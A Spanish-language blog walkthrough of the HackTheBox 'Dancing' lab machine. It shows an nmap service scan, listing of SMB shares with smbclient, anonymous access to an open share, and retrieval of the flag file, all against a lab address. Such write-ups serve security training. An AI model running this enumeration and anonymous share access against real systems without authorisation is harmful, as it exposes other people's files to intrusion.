---
title: Dancing HTB Walkthrough
published: true
---

# Dancing HTB

En este artículo trataré la resolución de una de las máquinas del Tier 0 del starting point de HackTheBox. 

## Fase de reconocimiento

Tras ejecutar nmap obtenemos la siguiente respuesta:

```
$nmap -sCV 10.129.1.12

Nmap scan report for 10.129.1.12
Host is up (0.12s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

│ Host script results:
|_clock-skew: 4h04m24s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-04-26T23:38:28
|_  start_date: N/A
```

Vemos que el puerto 445 se encuentra abierto y corre smb. Por lo que tratamos de listar los 
recursos compartidos.

```
$smbclient -L //10.129.1.12/

Enter WORKGROUP\ 's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available
```

Vemos que el recurso `WorkShares` no requiere de autenticación, por lo que tratamos de acceder:

```
$smbclient //10.129.1.12/WorkShares

smb: \> ls
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021

		5114111 blocks of size 4096. 1752259 blocks available

smb: \> cd James.P\

smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021

		5114111 blocks of size 4096. 1752524 blocks available

smb: \James.P\> get flag.txt 
getting file \James.P\flag.txt of size 32 as flag.txt (0,1 KiloBytes/sec) (average 0,2 KiloBytes/sec)

smb: \James.P\> quit
```

Vemos que en el directorio `James.P` hay un archivo `flag.txt`, lo descargamos con `get` y comprobamos que es la flag.


Muchas gracias por leer el post, y seguid hack.